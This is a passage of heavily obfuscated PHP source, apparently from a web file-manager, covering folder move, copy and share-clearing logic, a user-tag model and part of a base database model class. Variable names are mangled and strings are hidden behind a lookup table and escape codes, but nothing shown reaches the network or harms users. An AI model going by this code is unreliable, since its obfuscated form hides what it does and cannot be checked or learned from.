!0; } return $Ç´ãÁåÓÍ´; } private function _moveForce($€„‘·Ìµş, $¡ú, $¥â•ƒ“°óŞÆô) { $®ù‡Óµïš “ =& $_SERVER[ÀÆ]; $¡Ø¶¹ßï = $this->sourceInfo($€„‘·Ìµş); $Ù«¯ÙÆµŠÏªî = $this->sourceInfo($¡ú); $—³úç‰äÜ™Ş = $¡Ø¶¹ßï[$®ù‡Óµïš “[405]] == $®ù‡Óµïš “[87]; $–’ÆŞàúŞ¥š“ = array($®ù‡Óµïš “[396] => $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[397]], $®ù‡Óµïš “[578] => $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[515]] . $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[397]] . $®ù‡Óµïš “[47], $®ù‡Óµïš “[574] => $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[406]], $®ù‡Óµïš “[575] => $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[498]], $®ù‡Óµïš “[577] => USER_ID, $®ù‡Óµïš “[415] => $¥â•ƒ“°óŞÆô); $ÍäŒº¡Ø¡ = $¡Ø¶¹ßï[$®ù‡Óµïš “[406]] == SourceModel::TYPE_GROUP && $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[406]] == SourceModel::TYPE_GROUP && $¡Ø¶¹ßï[$®ù‡Óµïš “[498]] == $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[498]]; if (!$ÍäŒº¡Ø¡ && $this->moveClearAuth) { Model($®ù‡Óµïš “[496])->authClear($€„‘·Ìµş); } $âÃÕ·¹Õ¿ = $¡Ø¶¹ßï[$®ù‡Óµïš “[425]] == $®ù‡Óµïš “[87] && $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[425]] != $®ù‡Óµïš “[87]; if ($âÃÕ·¹Õ¿) { $–’ÆŞàúŞ¥š“[$®ù‡Óµïš “[424]] = 0; } if ($—³úç‰äÜ™Ş) { $¹Ì–—È¶Ê«æç = array($®ù‡Óµïš “[578] => array($®ù‡Óµïš “[538], $¡Ø¶¹ßï[$®ù‡Óµïš “[515]] . $¡Ø¶¹ßï[$®ù‡Óµïš “[397]] . $®ù‡Óµïš “[539])); $ó = $¡Ø¶¹ßï[$®ù‡Óµïš “[515]] . $¡Ø¶¹ßï[$®ù‡Óµïš “[397]] . $®ù‡Óµïš “[47]; $Ã = $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[515]] . $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[397]] . $®ù‡Óµïš “[47] . $¡Ø¶¹ßï[$®ù‡Óµïš “[397]] . $®ù‡Óµïš “[47]; $ò½ËĞ = array($®ù‡Óµïš “[578] => array($®ù‡Óµïš “[587], "\x72\145\160\x6c\141\x63\145\50\160\141\162\145\156\x74\x4c\145\x76\x65\154\x2c\x27{$ó}\x27\x2c\x27{$Ã}\x27\51"), $®ù‡Óµïš “[574] => $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[406]], $®ù‡Óµïš “[575] => $Ù«¯ÙÆµŠÏªî[$®ù‡Óµïš “[498]]); if ($âÃÕ·¹Õ¿) { $ò½ËĞ[$®ù‡Óµïš “[424]] = 0; } $this->where($¹Ì–—È¶Ê«æç)->data($ò½ËĞ)->save(); } $this->where(array($®ù‡Óµïš “[412] => $€„‘·Ìµş))->data($–’ÆŞàúŞ¥š“)->save(); return $€„‘·Ìµş; } private function clearShare($„ÆÜ, $ÏÎòµš«) { $Á®«¼íñöĞæ =& $_SERVER[ÀÆ]; $Ø¿š—ı¤– = $this->sourceInfo($„ÆÜ); $ èû¾æíîÍÀÊ = $this->sourceInfo($ÏÎòµš«); if ($Ø¿š—ı¤–[$Á®«¼íñöĞæ[498]] == $ èû¾æíîÍÀÊ[$Á®«¼íñöĞæ[498]] && $Ø¿š—ı¤–[$Á®«¼íñöĞæ[406]] == $Á®«¼íñöĞæ[588]) { return; } $ßğÛş¯šºÅİË = array($Á®«¼íñöĞæ[515] => array($Á®«¼íñöĞæ[538], $Ø¿š—ı¤–[$Á®«¼íñöĞæ[515]] . $„ÆÜ . $Á®«¼íñöĞæ[539])); $ºß–úÔøÏ = $this->field($Á®«¼íñöĞæ[412])->where($ßğÛş¯šºÅİË)->getField($Á®«¼íñöĞæ[397], !0); if (!$ºß–úÔøÏ) { return; } $ßğÛş¯šºÅİË = array($Á®«¼íñöĞæ[397] => array($Á®«¼íñöĞæ[7], $ºß–úÔøÏ), $Á®«¼íñöĞæ[489] => 1); $ë‡áøŸ´“ = Model($Á®«¼íñöĞæ[589])->field($Á®«¼íñöĞæ[482])->where($ßğÛş¯šºÅİË)->select(); if (!$ë‡áøŸ´“) { return; } $ë‡áøŸ´“ = array_to_keyvalue($ë‡áøŸ´“, $Á®«¼íñöĞæ[33], $Á®«¼íñöĞæ[482]); $ßğÛş¯šºÅİË = array($Á®«¼íñöĞæ[482] => array($Á®«¼íñöĞæ[7], $ë‡áøŸ´“)); Model($Á®«¼íñöĞæ[589])->where($ßğÛş¯šºÅİË)->save(array($Á®«¼íñöĞæ[489] => 0)); Model($Á®«¼íñöĞæ[590])->where($ßğÛş¯šºÅİË)->delete(); } public function copyFolderFromIO($Õš, $Â—°è–ğ, $˜ß²ƒ›‹Ô, $ì–ªÓÈşŸ, $ÃŒ¤€”èø, $ôîò¦·í†À = false) { $÷† =& $_SERVER[ÀÆ]; $ÈÊ = array($÷†[555] => array(), $÷†[556] => array(), $÷†[554] => array(), $÷†[591] => array()); $øÑŠ = $ôîò¦·í†À ? $ôîò¦·í†À : $Õš->pathThis($Â—°è–ğ); $ÏñèºÑ = $this->fileNameExist($˜ß²ƒ›‹Ô, $øÑŠ); $ú’« = $this->mkdir($˜ß²ƒ›‹Ô, $øÑŠ, $ì–ªÓÈşŸ); if (!$ÏñèºÑ || $ì–ªÓÈşŸ == REPEAT_RENAME_FOLDER) { $ì–ªÓÈşŸ = !1; } if ($ÏñèºÑ) { $this->_childrenAllMake($ÏñèºÑ); } Hook::trigger($÷†[592]); $this->_copyChildTo($Õš, $Â—°è–ğ, $ú’«, $ì–ªÓÈşŸ, $ÈÊ, $ÃŒ¤€”èø); Hook::trigger($÷†[593]); if ($ú’«) { $this->folderSizeResetChildren($ú’«); } $this->_childrenListClear(); Model($÷†[557])->addAll($ÈÊ[$÷†[555]], array(), !0); Model($÷†[558])->eventCopy($ú’«); $this->saveAll($ÈÊ[$÷†[556]]); Model($÷†[464])->linkAdd($ÈÊ[$÷†[554]]); Model($÷†[464])->remove($ÈÊ[$÷†[591]]); $this->folderSizeReset($˜ß²ƒ›‹Ô); $this->updateModifyTime($˜ß²ƒ›‹Ô); return $ú’«; } private function _copyChildTo($¬, $ºç², $¨İ¤º–, $óµ‘, &$¬¸…û, $¡÷’Æ) { $¬‘£Ã =& $_SERVER[ÀÆ]; $Ã£’Éê™… = $this->sourceInfoCache($¨İ¤º–); $ÉÅÖ = $¬->listPath($ºç²); $ÉÅÖ = $ÉÅÖ ? $ÉÅÖ : array($¬‘£Ã[74] => array(), $¬‘£Ã[75] => array()); $™¾ÜÅîø¦ÒõÆ = array_merge($ÉÅÖ[$¬‘£Ã[74]], $ÉÅÖ[$¬‘£Ã[75]]); $ƒˆÄî = $this->_addFiles($¬, $ÉÅÖ[$¬‘£Ã[74]], $¡÷’Æ); $ÉºÑ¶ãÂà¿‘á = array(); foreach ($™¾ÜÅîø¦ÒõÆ as &$——Æ“²‡•öşÚ) { if (isset($ƒˆÄî[$——Æ“²‡•öşÚ[$¬‘£Ã[28]]])) { $——Æ“²‡•öşÚ = $ƒˆÄî[$——Æ“²‡•öşÚ[$¬‘£Ã[28]]]; } $——Æ“²‡•öşÚ[$¬‘£Ã[405]] = $——Æ“²‡•öşÚ[$¬‘£Ã[29]] == $¬‘£Ã[77]; $——Æ“²‡•öşÚ[$¬‘£Ã[407]] = _get($——Æ“²‡•öşÚ, $¬‘£Ã[168], $¬‘£Ã[33]); $——Æ“²‡•öşÚ[$¬‘£Ã[78]] = _get($——Æ“²‡•öşÚ, $¬‘£Ã[78], 0); $——Æ“²‡•öşÚ[$¬‘£Ã[461]] = _get($——Æ“²‡•öşÚ, $¬‘£Ã[461], 0); if (!isset($——Æ“²‡•öşÚ[$¬‘£Ã[594]]) && $——Æ“²‡•öşÚ[$¬‘£Ã[461]]) { $¬¸…û[$¬‘£Ã[591]][] = $——Æ“²‡•öşÚ[$¬‘£Ã[461]]; } if ($óµ‘) { $äïÌĞæË† = $this->fileNameExistCache($¨İ¤º–, $——Æ“²‡•öşÚ[$¬‘£Ã[28]]); if ($äïÌĞæË†) { if ($——Æ“²‡•öşÚ[$¬‘£Ã[405]] || $óµ‘ == REPEAT_SKIP) { continue; } if ($óµ‘ == REPEAT_REPLACE) { $²ÒÎ•Ş¬ = $this->sourceInfoCache($äïÌĞæË†); $Â±áÀı«ä«¹ = $this->fileHistory($²ÒÎ•Ş¬, $——Æ“²‡•öşÚ[$¬‘£Ã[461]], $——Æ“²‡•öşÚ[$¬‘£Ã[78]]); if ($Â±áÀı«ä«¹) { $¬¸…û[$¬‘£Ã[554]][] = $——Æ“²‡•öşÚ[$¬‘£Ã[461]]; } continue; } else { if ($óµ‘ == REPEAT_RENAME) { $——Æ“²‡•öşÚ[$¬‘£Ã[28]] = $this->fileNameAutoCache($¨İ¤º–, $——Æ“²‡•öşÚ[$¬‘£Ã[28]], $óµ‘, !1); } } } } if (!$——Æ“²‡•öşÚ[$¬‘£Ã[405]] && $——Æ“²‡•öşÚ[$¬‘£Ã[461]]) { $¬¸…û[$¬‘£Ã[554]][] = $——Æ“²‡•öşÚ[$¬‘£Ã[461]]; } $ÉºÑ¶ãÂà¿‘á[] = $this->_makeItemData($——Æ“²‡•öşÚ, $Ã£’Éê™…, $——Æ“²‡•öşÚ[$¬‘£Ã[28]]); } unset($——Æ“²‡•öşÚ); if (!empty($ÉºÑ¶ãÂà¿‘á)) { $this->addAll($ÉºÑ¶ãÂà¿‘á); $this->_childrenListSelect($¨İ¤º–); } $û = $this->_childrenList($¨İ¤º–); $û = array_to_keyvalue($û, $¬‘£Ã[28]); foreach ($™¾ÜÅîø¦ÒõÆ as $——Æ“²‡•öşÚ) { $²ÒÎ•Ş¬ = $û[$——Æ“²‡•öşÚ[$¬‘£Ã[28]]]; $¶Ç×€’ˆ”¿ = $²ÒÎ•Ş¬[$¬‘£Ã[397]]; $this->_copyApplyMeta($²ÒÎ•Ş¬, $¬¸…û); if ($——Æ“²‡•öşÚ[$¬‘£Ã[29]] == $¬‘£Ã[77]) { $——Æ“²‡•öşÚ[$¬‘£Ã[76]] = $¬->getPathInner($——Æ“²‡•öşÚ[$¬‘£Ã[76]]); $this->_copyChildTo($¬, $——Æ“²‡•öşÚ[$¬‘£Ã[76]], $¶Ç×€’ˆ”¿, $óµ‘, $¬¸…û, $¡÷’Æ); } } } private function _addFiles($ğé²èÍê, $¤áçğ˜ãÚô¥¨, $Ôíµ¶“ßùˆ¹ë) { $Š…îÚŒåæâ =& $_SERVER[ÀÆ]; if (!$¤áçğ˜ãÚô¥¨ || count($¤áçğ˜ãÚô¥¨) == 0) { return array(); } $á†ìÙÉßš = array(); foreach ($¤áçğ˜ãÚô¥¨ as &$¥î×ÀøÙÏ¬Ö) { Hook::trigger($Š…îÚŒåæâ[595], $¥î×ÀøÙÏ¬Ö); $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[76]] = $ğé²èÍê->getPathInner($¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[76]]); $´ÂÍ = $ğé²èÍê->hashSimple($¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[76]]); $ŞÎİÇñü¢¥ = $ğé²èÍê->hashMd5($¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[76]]); if (strlen($ŞÎİÇñü¢¥) > 10 && !isset($á†ìÙÉßš[$ŞÎİÇñü¢¥])) { $á†ìÙÉßš[$ŞÎİÇñü¢¥] = array(); } $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[171]] = $´ÂÍ; $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[170]] = $ŞÎİÇñü¢¥; Hook::trigger($Š…îÚŒåæâ[596], $¥î×ÀøÙÏ¬Ö); $á†ìÙÉßš[$ŞÎİÇñü¢¥][] =& $¥î×ÀøÙÏ¬Ö; if (count($á†ìÙÉßš[$ŞÎİÇñü¢¥]) > 1) { $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[594]] = !0; } } unset($¥î×ÀøÙÏ¬Ö); $ñø¬Ä = array($Š…îÚŒåæâ[170] => array($Š…îÚŒåæâ[7], array_keys($á†ìÙÉßš))); $éÕ£³ÁÃ = Model($Š…îÚŒåæâ[597]); $ì§™ = $éÕ£³ÁÃ->where($ñø¬Ä)->select(); $ì§™ = $ì§™ ? $ì§™ : array(); foreach ($ì§™ as $ñ¹‡òŒÏö¦) { if (!isset($á†ìÙÉßš[$ñ¹‡òŒÏö¦[$Š…îÚŒåæâ[170]]])) { continue; } $Ö¥‹œ = $á†ìÙÉßš[$ñ¹‡òŒÏö¦[$Š…îÚŒåæâ[170]]]; foreach ($Ö¥‹œ as &$¥î×ÀøÙÏ¬Ö) { $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[461]] = $ñ¹‡òŒÏö¦[$Š…îÚŒåæâ[461]]; $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[594]] = !0; } unset($¥î×ÀøÙÏ¬Ö); } $Ÿû÷éœğí³€ = array(); foreach ($¤áçğ˜ãÚô¥¨ as $™š) { if (isset($™š[$Š…îÚŒåæâ[594]]) && $™š[$Š…îÚŒåæâ[594]]) { continue; } $îª¹é = $ğé²èÍê->getPathInner($™š[$Š…îÚŒåæâ[76]]); $ÙÅå¶ƒ = $éÕ£³ÁÃ->addFileMake($îª¹é, $™š[$Š…îÚŒåæâ[78]], $™š[$Š…îÚŒåæâ[171]], $™š[$Š…îÚŒåæâ[170]], $™š[$Š…îÚŒåæâ[28]], $Ôíµ¶“ßùˆ¹ë); $Ÿû÷éœğí³€[] = $ÙÅå¶ƒ; } $éÕ£³ÁÃ->addAll($Ÿû÷éœğí³€); $ñø¬Ä = array($Š…îÚŒåæâ[170] => array($Š…îÚŒåæâ[7], array_keys($á†ìÙÉßš))); $ì§™ = $éÕ£³ÁÃ->where($ñø¬Ä)->select(); $ì§™ = $ì§™ ? $ì§™ : array(); foreach ($ì§™ as $ñ¹‡òŒÏö¦) { if (!isset($á†ìÙÉßš[$ñ¹‡òŒÏö¦[$Š…îÚŒåæâ[170]]])) { continue; } $§úûÅÒí± =& $á†ìÙÉßš[$ñ¹‡òŒÏö¦[$Š…îÚŒåæâ[170]]]; foreach ($§úûÅÒí± as &$¥î×ÀøÙÏ¬Ö) { $¥î×ÀøÙÏ¬Ö[$Š…îÚŒåæâ[461]] = $ñ¹‡òŒÏö¦[$Š…îÚŒåæâ[461]]; } unset($¥î×ÀøÙÏ¬Ö); } $÷µïš®¸âÙ = array(); foreach ($¤áçğ˜ãÚô¥¨ as $¼ş£¨ÀÓ•Çœ) { $÷µïš®¸âÙ[$¼ş£¨ÀÓ•Çœ[$Š…îÚŒåæâ[28]]] = $¼ş£¨ÀÓ•Çœ; } return $÷µïš®¸âÙ; } } goto fô Ë‘“¾’; DÀÂ‘„ÛÎ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\145\162\x2e\164\141\147\x4c\x69\163\x74"; public $modelType = "\x55\x73\145\162\x4f\160\164\x69\157\x6e"; public $field = array("\x6e\x61\x6d\145", "\x73\x74\171\x6c\145", "\x73\x6f\x72\164"); public function listData($×ğ ÂÄ˜ = false, $îç…Å = "\163\x6f\x72\x74", $‰ÖÂõ¬ñ = false) { return parent::listData($×ğ ÂÄ˜, $îç…Å, $‰ÖÂõ¬ñ); } public function remove($™´›) { return parent::remove($™´›); } public function add($ûÔ§“Ö‹«ê™´, $½»ÁÑ˜”ÃßÆî = "\x6c\x61\142\x65\154\x2d\x67\x72\x65\171\x2d\x6e\x6f\x72\x6d\141\154") { $çıµÍÛîèì =& $_SERVER[ÀÆ]; if ($this->findByName($ûÔ§“Ö‹«ê™´)) { return !1; } $ƒ¬«î‹ = array($çıµÍÛîèì[415] => $ûÔ§“Ö‹«ê™´, $çıµÍÛîèì[478] => $½»ÁÑ˜”ÃßÆî, $çıµÍÛîèì[1743] => $this->getSort($çıµÍÛîèì[256]) + 1); return parent::insert($ƒ¬«î‹); } public function update($öÉ¤¦‰ÑÑÔâ, $şØ“Óûãå½‰) { $ïµŞ¾¥ =& $_SERVER[ÀÆ]; $ø„Ê‡¬ = $this->listData($öÉ¤¦‰ÑÑÔâ); $ıÄ½…¯÷“ = $this->findByName($şØ“Óûãå½‰[$ïµŞ¾¥[28]]); if (!$ø„Ê‡¬ || $ıÄ½…¯÷“ && $ıÄ½…¯÷“[$ïµŞ¾¥[395]] != $ø„Ê‡¬[$ïµŞ¾¥[395]]) { return !1; } return parent::update($öÉ¤¦‰ÑÑÔâ, $şØ“Óûãå½‰); } public function moveTop($µ¦Ù) { $’ÓÁœÆô½€¹Ú =& $_SERVER[ÀÆ]; $ôûì®üÕ¹—İõ = parent::listData(); $ô·ò = $this->getSort($’ÓÁœÆô½€¹Ú[255]); foreach ($ôûì®üÕ¹—İõ as &$‡­Ş°) { if ($‡­Ş°[$’ÓÁœÆô½€¹Ú[395]] == $µ¦Ù) { $‡­Ş°[$’ÓÁœÆô½€¹Ú[1762]] = $ô·ò; continue; } $‡­Ş°[$’ÓÁœÆô½€¹Ú[1762]] += 1; } unset($‡­Ş°); return parent::resetData($ôûì®üÕ¹—İõ); } public function moveBottom($’±†“ÎÆÑË) { $³¹øà£Ú =& $_SERVER[ÀÆ]; $éŸŸéÕù = $this->getSort($³¹øà£Ú[256]) + 1; return parent::update($’±†“ÎÆÑË, array($³¹øà£Ú[1762] => $éŸŸéÕù)); } public function resetSort($ÎŠÎíñ‰•) { $õ–Â =& $_SERVER[ÀÆ]; $ˆ °á = array(); $ÎŠÎíñ‰• = is_array($ÎŠÎíñ‰•) ? $ÎŠÎíñ‰• : array(); for ($¾Â = 0; $¾Â < count($ÎŠÎíñ‰•); $¾Â++) { $ˆ °á[$ÎŠÎíñ‰•[$¾Â] . $õ–Â[33]] = $¾Â + 1; } $Öè¯ı”Ú¸˜ = parent::listData(); foreach ($Öè¯ı”Ú¸˜ as &$ò‚æÃÇ) { $¤˜†Şü±ã = $ˆ °á[$ò‚æÃÇ[$õ–Â[395]]]; $ò‚æÃÇ[$õ–Â[1762]] = $¤˜†Şü±ã ? $¤˜†Şü±ã : $ò‚æÃÇ[$õ–Â[1762]]; } unset($ò‚æÃÇ); return parent::resetData($Öè¯ı”Ú¸˜); } private function getSort($…±Çé«’¢) { $ÑÕş =& $_SERVER[ÀÆ]; $Íë»Ò· = parent::listData(); $¦¿… = array_to_keyvalue($Íë»Ò·, $ÑÕş[33], $ÑÕş[1762]); if (!$¦¿…) { $¦¿… = array(0); } $æÉñ„ªà‘ß¶ = $…±Çé«’¢ == $ÑÕş[256] ? max($¦¿…) : min($¦¿…); return intval($æÉñ„ªà‘ß¶); } } goto CåÔÍ§¹î…; CŒôáñŒ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\x6c\145", "\x6f\x72\144\x65\x72", "\x61\x6c\151\x61\163", "\150\141\x76\x69\156\147", "\147\162\x6f\165\160", "\154\157\x63\x6b", "\144\x69\x73\x74\x69\x6e\x63\x74", "\141\165\x74\x6f", "\x66\x69\154\164\145\x72", "\x76\141\x6c\151\144\x61\x74\x65", "\162\x65\x73\165\x6c\x74", "\x62\x69\156\x64", "\x74\157\153\145\156"); public function __construct($ƒœÈ†ôş‡£… = '', $¦õî = '', $¸ÅÇÇÓÓ ÌÕó = '') { $À­ =& $_SERVER[ÀÆ]; $this->_initialize(); if (!empty($ƒœÈ†ôş‡£…)) { if (strpos($ƒœÈ†ôş‡£…, $À­[95])) { list($this->dbName, $this->name) = explode($À­[95], $ƒœÈ†ôş‡£…); } else { $this->name = $ƒœÈ†ôş‡£…; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¦õî)) { $this->tablePrefix = $À­[33]; } elseif ($À­[33] != $¦õî) { $this->tablePrefix = $¦õî; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($À­[242]); } $this->db(0, empty($this->connection) ? $¸ÅÇÇÓÓ ÌÕó : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ı×´Ÿêáà =& $_SERVER[ÀÆ]; if (empty($this->fields)) { if (think_config($ı×´Ÿêáà[243])) { $Ôäåñ’ïØ = $this->dbName ? $this->dbName : think_config($ı×´Ÿêáà[244]); $¼ = think_var_cache($ı×´Ÿêáà[245] . strtolower(get_path_this($Ôäåñ’ïØ) . $ı×´Ÿêáà[95] . $this->name)); if ($¼) { $•Œ = think_config($ı×´Ÿêáà[246]); if (empty($•Œ) || $¼[$ı×´Ÿêáà[247]] == $•Œ) { $this->fields = $¼; return; } } } $this->flush(); } } public function flush() { $Íƒ‚ =& $_SERVER[ÀÆ]; $this->db->setModel($this->name); $´ = $this->db->getFields($this->getTableName()); if (!$´) { return !1; } $this->fields = array_keys($´); $this->fields[$Íƒ‚[248]] = !1; foreach ($´ as $ƒğŞ•ôª¤ï½ => $‘äáÛñäî±ö) { $õ¶ÖĞ[$ƒğŞ•ôª¤ï½] = $‘äáÛñäî±ö[$Íƒ‚[29]]; if ($‘äáÛñäî±ö[$Íƒ‚[36]]) { $this->fields[$Íƒ‚[249]] = $ƒğŞ•ôª¤ï½; if ($‘äáÛñäî±ö[$Íƒ‚[39]]) { $this->fields[$Íƒ‚[248]] = !0; } } } $this->fields[$Íƒ‚[250]] = $õ¶ÖĞ; if (think_config($Íƒ‚[246])) { $this->fields[$Íƒ‚[247]] = think_config($Íƒ‚[246]); } if (think_config($Íƒ‚[243])) { $½º = $this->dbName ? $this->dbName : think_config($Íƒ‚[244]); think_var_cache($Íƒ‚[245] . strtolower(get_path_this($½º) . $Íƒ‚[95] . $this->name), $this->fields); } } public function switchModel($Å¥£¢ºò, $ıË±‡ƒ…ˆ¼ä‘ = array()) { $´‘İ =& $_SERVER[ÀÆ]; $âüŒ® = ucwords(strtolower($Å¥£¢ºò)) . $´‘İ[251]; if (!class_exists($âüŒ®)) { think_exception($âüŒ® . think_lang($´‘İ[252])); } $this->_extModel = new $âüŒ®($this->name); if (!empty($ıË±‡ƒ…ˆ¼ä‘)) { foreach ($ıË±‡ƒ…ˆ¼ä‘ as $¾ëú) { $this->_extModel->setProperty($¾ëú, $this->{$¾ëú}); } } return $this->_extModel; } public function __set($ßš, $«) { $this->data[$ßš] = $«; } public function __get($Óƒ™¹) { return isset($this->data[$Óƒ™¹]) ? $this->data[$Óƒ™¹] : null; } public function __isset($ùœ) { return isset($this->data[$ùœ]); } public function __unset($çä°Ş‰üÍÜá) { unset($this->data[$çä°Ş‰üÍÜá]); } public function __call($¨ã”†¥ÅÍÄ, $Î•) { $Ÿş =& $_SERVER[ÀÆ]; if (in_array(strtolower($¨ã”†¥ÅÍÄ), $this->methods, !0)) { $this->options[strtolower($¨ã”†¥ÅÍÄ)] = $Î•[0]; return $this; } elseif (in_array(strtolower($¨ã”†¥ÅÍÄ), array($Ÿş[253], $Ÿş[254], $Ÿş[255], $Ÿş[256], $Ÿş[257]), !0)) { $ËÔ°÷¬†Ø— = isset($Î•[0]) ? $Î•[0] : $Ÿş[182]; $ËÔ°÷¬†Ø— = $this->db->parseKey($ËÔ°÷¬†Ø—); return $this->getField(strtoupper($¨ã”†¥ÅÍÄ) . $Ÿş[258] . $ËÔ°÷¬†Ø— . $Ÿş[259] . $¨ã”†¥ÅÍÄ, $Ÿş[253]); } elseif (strtolower(substr($¨ã”†¥ÅÍÄ, 0, 5)) == $Ÿş[260]) { $ËÔ°÷¬†Ø— = think_parse_name(substr($¨ã”†¥ÅÍÄ, 5)); $Ç·ş†ÂæáÃ[$ËÔ°÷¬†Ø—] = $Î•[0]; return $this->where($Ç·ş†ÂæáÃ)->find(); } elseif (strtolower(substr($¨ã”†¥ÅÍÄ, 0, 10)) == $Ÿş[261]) { $¾œ°š = think_parse_name(substr($¨ã”†¥ÅÍÄ, 10)); $Ç·ş†ÂæáÃ[$¾œ°š] = $Î•[0]; return $this->where($Ç·ş†ÂæáÃ)->getField($Î•[1]); } elseif (isset($this->_scope[$¨ã”†¥ÅÍÄ])) { return $this->scope($¨ã”†¥ÅÍÄ, $Î•[0]); } elseif (method_exists($this, $¨ã”†¥ÅÍÄ)) { array_unshift($Î•, $¨ã”†¥ÅÍÄ); return call_user_func_array(array($this, $Ÿş[262]), $Î•); } else { return call_user_func_array(array(parent, $¨ã”†¥ÅÍÄ), $Î•); } } protected function call() { $ÑİË§ =& $_SERVER[ÀÆ]; $¿¿¸ = func_get_args(); $Ú¦ = array_shift($¿¿¸); $ = $Ú¦; if (is_array($Ú¦)) { $ = $Ú¦[1]; $Ú¦ = $Ú¦[0]; } $Ë „ = count($¿¿¸) - 1; if (isset($¿¿¸[$Ë „]) && $¿¿¸[$Ë „] === $Ú¦) { think_exception(__CLASS__ . $ÑİË§[4] . $Ú¦ . think_lang($ÑİË§[263])); return; } $¿¿¸[] = $Ú¦; if (method_exists($this, $ÑİË§[264])) { $Œ = call_user_func_array(array($this, $ÑİË§[265]), array($, $¿¿¸)); if (!is_null($Œ) && $Œ !== !1) { return $Œ; } } $Ç¦ùÁ—æ‡’ = call_user_func_array(array($this, $Ú¦), $¿¿¸); if (method_exists($this, $ÑİË§[266])) { $Œ = call_user_func_array(array($this, $ÑİË§[267]), array($, $¿¿¸, $Ç¦ùÁ—æ‡’)); if ($Œ) { return $Œ; } } return $Ç¦ùÁ—æ‡’; } protected function _initialize() { } protected function _facade($‰ß¹úá) { $Å‡æ³ =& $_SERVER[ÀÆ]; if (!empty($this->fields)) { foreach ($‰ß¹úá as $¿ƒó => $ø™Û˜èå¤Ø) { if (is_array($this->fields) && !in_array($¿ƒó, $this->fields, !0)) { unset($‰ß¹úá[$¿ƒó]); } elseif (is_scalar($ø™Û˜èå¤Ø)) { $this->_parseType($‰ß¹úá, $¿ƒó); } } } if (!empty($this->options[$Å‡æ³[268]])) { $‰ß¹úá = array_map($this->options[$Å‡æ³[268]], $‰ß¹úá); unset($this->options[$Å‡æ³[268]]); } $this->_beforeWrite($‰ß¹úá); return $‰ß¹úá; } protected function _beforeWrite(&$ÙòßöÙ) { } public function add($’ = '', $–¨ˆ = array(), $ö¢ıÌ®Òš²Ğ = false) { if (empty($’)) { if (!empty($this->data)) { $’ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÀÆ][269]); return !1; } } $–¨ˆ = $this->_parseOptions($–¨ˆ); $’ = $this->_facade($’); if (!1 === $this->_beforeInsert($’, $–¨ˆ)) { return !1; } $Áö±±Ú°ó = $this->db->insert($’, $–¨ˆ, $ö¢ıÌ®Òš²Ğ); if (!1 !== $Áö±±Ú°ó) { $‰·ä²½˜Øëîî = $this->getLastInsID(); if ($‰·ä²½˜Øëîî) { $’[$this->getPk()] = $‰·ä²½˜Øëîî; $this->_after_insert($’, $–¨ˆ); return $‰·ä²½˜Øëîî; } $this->_after_insert($’, $–¨ˆ); } return $Áö±±Ú°ó; } protected function _beforeInsert(&$¼öæ¦Ã…Ò, $ÄÏæªÂ) { } protected function _after_insert($—Ôï’ÙØ÷„í÷, $°Û½) { } public function addAll($Á¾ª…íòÁ, $ı«‘©¼™ = array(), $×“‰÷ = false) { $¹“ÉÄéÙ«Ó =& $_SERVER[ÀÆ]; if (empty($Á¾ª…íòÁ)) { $this->error = think_lang($¹“ÉÄéÙ«Ó[269]); return !1; } $ı«‘©¼™ = $this->_parseOptions($ı«‘©¼™); foreach ($Á¾ª…íòÁ as $¨Û˜ÄÒ => $ÈØèÖú¨öêƒ) { $Á¾ª…íòÁ[$¨Û˜ÄÒ] = $this->_facade($ÈØèÖú¨öêƒ); } if (method_exists($this->db, $¹“ÉÄéÙ«Ó[270])) { $‚Ã = $this->db->insertAll($Á¾ª…íòÁ, $ı«‘©¼™, $×“‰÷); } else { $this->startTrans(); foreach ($Á¾ª…íòÁ as $¨Û˜ÄÒ => $ÈØèÖú¨öêƒ) { $‚Ã = $this->db->insert($ÈØèÖú¨öêƒ, $ı«‘©¼™, $×“‰÷); } $this->commit(); } if (!1 !== $‚Ã) { $ó§èÔ„Ä = $this->getLastInsID(); if ($ó§èÔ„Ä) { return $ó§èÔ„Ä; } } return $‚Ã; } public function selectAdd($ëÙ®ÍÁÉ = '', $§ = '', $²ØÂ™Æã = array()) { $…ØÜ =& $_SERVER[ÀÆ]; $²ØÂ™Æã = $this->_parseOptions($²ØÂ™Æã); if (!1 === ($Í´¹ = $this->db->selectInsert($ëÙ®ÍÁÉ ? $ëÙ®ÍÁÉ : $²ØÂ™Æã[$…ØÜ[271]], $§ ? $§ : $this->getTableName(), $²ØÂ™Æã))) { $this->error = think_lang($…ØÜ[272]); return !1; } else { return $Í´¹; } } public function save($‚¼™ğáâÒÜ = '', $õÎºãÉÍë× = array()) { $â =& $_SERVER[ÀÆ]; if 